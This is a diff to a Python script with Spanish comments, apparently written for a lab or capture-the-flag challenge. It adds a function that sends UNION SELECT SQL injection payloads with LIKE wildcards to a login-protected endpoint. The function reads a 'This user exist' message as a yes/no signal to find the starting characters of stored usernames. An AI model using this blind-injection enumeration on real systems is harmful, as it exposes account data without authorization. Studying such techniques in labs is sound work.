@@ -10,13 +10,24 @@ def iniciar_sesion(username,password,url):
     return session
 
 
+#This function find the first initial character of the usernames stored in the database
+def get_start_char(characters):
+    start_char = []
+    for char in characters:
+        print(f"intentando con {char}")
+        payload = {'username': "\" UNION SELECT * from users WHERE username LIKE \""+char+"%" }
+        r= session.post(url,auth=(username, password),data=payload)
+        if b"This user exist" in r.content:
+            print(f"encontramos la siguiente inicial {char}")
+            start_char.append(char)
+    return start_char
               
 
 def obtener_nombres(username,password,session,url):
     characters = 'qwertyuiopñlkjhgfdsazxcvbnm1234567890QWERTYUIOPÑLKJHGFDSAZXCVBNM*?!#$&/()='
     contador = 0
-    start_users = ['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']
-
+    #['ñ','a', 'c', 'b', 'n', 'Ñ', 'A', 'C', 'B', 'N']
+    start_users = get_start_char(characters)
     print(f"estos son las iniciales de los usuarios")
     full_name = []
     for user_to_find in start_users:
